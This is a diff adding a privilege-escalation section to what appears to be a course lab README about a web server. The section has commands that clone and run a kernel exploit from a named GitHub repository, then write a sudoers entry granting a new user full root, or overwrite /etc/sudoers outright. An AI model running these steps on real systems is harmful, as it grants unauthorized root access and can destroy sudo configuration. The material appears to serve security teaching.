@@ -160,3 +160,45 @@ Go all the way to the bottom and add your server ip address (do `ip a` to get it
 192.168.7.145 nwit291.com
 ```
 Open your browser and type nwit291.com, you should have access to the webserver!!
+
+
+
+## SUdo Privi
+
+
+Create a user with no root privil
+```
+sudo useradd dany_Admin -m
+sudo passwd 
+```
+
+Switch user and Check priv
+```
+su - dany_Admin
+sudo apt update
+```
+
+You should get the user is not in the sudoers ...
+
+
+clone and deploy the exploit https://github.com/8Ten10/goubun.git
+
+or from your file server
+
+Switch in the directory `cd goubun` and compile with `make` and run the exploit with `./exploit`
+```
+cd goubun
+make
+./exploit
+```
+
+Add the user to the sudo file to escalate
+``
+echo "dany_Admin ALL=(ALL:ALL) ALL" > /etc/sudoers.d/poison
+```
+
+or
+```
+echo "dany_Admin ALL=(ALL:ALL) ALL" > /etc/sudoers
+```
+
